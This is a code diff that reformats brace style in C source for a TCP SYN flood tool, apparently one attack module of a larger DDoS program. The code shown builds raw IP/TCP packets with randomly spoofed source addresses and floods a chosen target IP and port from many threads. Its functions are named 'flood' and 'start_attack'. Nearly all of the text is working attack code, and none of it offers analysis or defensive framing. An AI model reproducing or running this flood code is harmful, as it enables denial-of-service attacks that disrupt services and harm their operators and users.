@@ -20,7 +20,8 @@ char target_ip[20] = {0};
 int target_port;
 int64_t count = 0;
 
-typedef struct ip_t {
+typedef struct ip_t
+{
     uint8_t header_len;
     uint8_t tos;
     uint16_t total_len;
@@ -33,7 +34,8 @@ typedef struct ip_t {
     uint32_t destIP;
 } ip;
 
-typedef struct tcphdr_t {
+typedef struct tcphdr_t
+{
     uint16_t sport;
     uint16_t dport;
     uint32_t seq;
@@ -45,7 +47,8 @@ typedef struct tcphdr_t {
     uint16_t urp;
 } tcphdr;
 
-typedef struct pseudohdr_t {
+typedef struct pseudohdr_t
+{
     uint32_t saddr;
     uint32_t daddr;
     uint8_t zero;
@@ -53,13 +56,16 @@ typedef struct pseudohdr_t {
     uint16_t length;
 } pseudohdr;
 
-uint16_t crc16_checksum(uint16_t *buffer, uint16_t size) {
+uint16_t crc16_checksum(uint16_t *buffer, uint16_t size)
+{
     uint64_t cksum = 0;
-    while (size > 1) {
+    while (size > 1)
+    {
         cksum += *buffer++;
         size -= sizeof(uint16_t);
     }
-    if (size) {
+    if (size)
+    {
         cksum += *(uint8_t *)buffer;
     }
     cksum = (cksum >> 16) + (cksum & 0xffff);
@@ -67,7 +73,8 @@ uint16_t crc16_checksum(uint16_t *buffer, uint16_t size) {
     return (uint16_t)(~cksum);
 }
 
-void initialize_headers(ip *ip, tcphdr *tcp, pseudohdr *pseudoheader) {
+void initialize_headers(ip *ip, tcphdr *tcp, pseudohdr *pseudoheader)
+{
     int len = sizeof(ip) + sizeof(tcphdr);
     ip->header_len = (4 << 4 | sizeof(ip) / sizeof(uint32_t));
     ip->total_len = htons(len);
@@ -95,7 +102,8 @@ void initialize_headers(ip *ip, tcphdr *tcp, pseudohdr *pseudoheader) {
     srand((unsigned)time(NULL));
 }
 
-void *flood(void *addr) {
+void *flood(void *addr)
+{
     uint8_t buf[100], sendbuf[100];
     int len;
     ip ip;
@@ -104,7 +112,8 @@ void *flood(void *addr) {
     len = sizeof(ip) + sizeof(tcphdr);
     initialize_headers(&ip, &tcp, &pseudoheader);
     struct sockaddr_in *target = (struct sockaddr_in *)addr;
-    while (alive) {
+    while (alive)
+    {
         ip.sourceIP = rand();
         memset(buf, 0, sizeof(buf));
         memcpy(buf, &ip, sizeof(ip));
@@ -118,20 +127,23 @@ void *flood(void *addr) {
         memcpy(sendbuf, &ip, sizeof(ip));
         memcpy(sendbuf + sizeof(ip), &tcp, sizeof(tcphdr));
         SYNC_ADD_AND_FETCH(count);
-        if (sendto(socketfd, sendbuf, len, 0, (struct sockaddr *)target, sizeof(struct sockaddr_in)) < 0) {
+        if (sendto(socketfd, sendbuf, len, 0, (struct sockaddr *)target, sizeof(struct sockaddr_in)) < 0)
+        {
             pthread_exit(NULL);
         }
     }
     return NULL;
 }
 
-void sig_int(int signo) {
+void sig_int(int signo)
+{
     alive = 0;
 }
 
-void start_attack(const char *ip, int port) {
+void start_attack(const char *ip, int port)
+{
 
-#ifdef DEBUG 
+#ifdef DEBUG
     printf("[synflood] Starting synflood (TCP) attack...\n");
 #endif
 
@@ -140,28 +152,30 @@ void start_attack(const char *ip, int port) {
     signal(SIGINT, sig_int);
     strncpy(target_ip, ip, sizeof(target_ip) - 1);
     target_port = port;
-    
+
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
     addr.sin_port = htons(target_port);
     addr.sin_addr.s_addr = inet_addr(target_ip);
-    
+
     socketfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (socketfd < 0) exit(1);
-    
+    if (socketfd < 0)
+        exit(1);
+
     int on = 1;
     setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
     setuid(getpid());
-    
-    for (int i = 0; i < MAXTHREADS; i++) {
+
+    for (int i = 0; i < MAXTHREADS; i++)
+    {
         pthread_create(&pthread[i], NULL, flood, &addr);
     }
-    
-    for (int i = 0; i < MAXTHREADS; i++) {
+
+    for (int i = 0; i < MAXTHREADS; i++)
+    {
         pthread_join(pthread[i], NULL);
     }
-    
+
     close(socketfd);
     exit(0);
 }
-
